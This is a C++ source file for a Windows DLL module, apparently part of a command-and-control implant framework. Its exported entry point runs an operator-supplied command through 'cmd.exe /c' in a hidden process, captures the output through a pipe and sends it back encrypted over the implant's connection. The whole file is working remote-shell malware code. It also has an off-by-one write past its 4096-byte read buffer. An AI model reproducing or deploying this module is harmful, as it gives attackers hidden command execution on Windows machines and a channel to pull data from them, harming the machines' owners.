#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <structs.h>

HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

HANDLE g_hInputFile = NULL;

void CreateChildProcess(std::string szCmdline);
std::string ReadFromPipe();

std::string command_execute(std::string cmd)
{
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
    SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
    CreateChildProcess(cmd);

    return ReadFromPipe();
}

void CreateChildProcess(std::string szCmdline)
{
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));


    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    CreateProcessA(NULL,
        (LPSTR)szCmdline.c_str(),
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        (LPSTARTUPINFOA)&siStartInfo,
        &piProcInfo);

    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

    CloseHandle(g_hChildStd_OUT_Wr);

}

std::string ReadFromPipe()
{
    DWORD dwRead;
    CHAR chBuf[4096];
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    std::string buffer;

    while (ReadFile(g_hChildStd_OUT_Rd, chBuf, sizeof(chBuf), &dwRead, NULL)) {
        chBuf[dwRead] = 0;
        buffer += chBuf;
    }
    return buffer;
}

extern "C" __declspec(dllexport) ULONG ModuleEntrypoint(MODULE_CONTEXT ctx) {
	OUTPUT response = { 0 };
	std::string _stdout = command_execute("cmd.exe /c " + ctx.argv.at(0));

    response.output_length = _stdout.length();
	memcpy(response.output, _stdout.data(), _stdout.length());
	ctx.send_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&response, sizeof(response));
	return 0;
}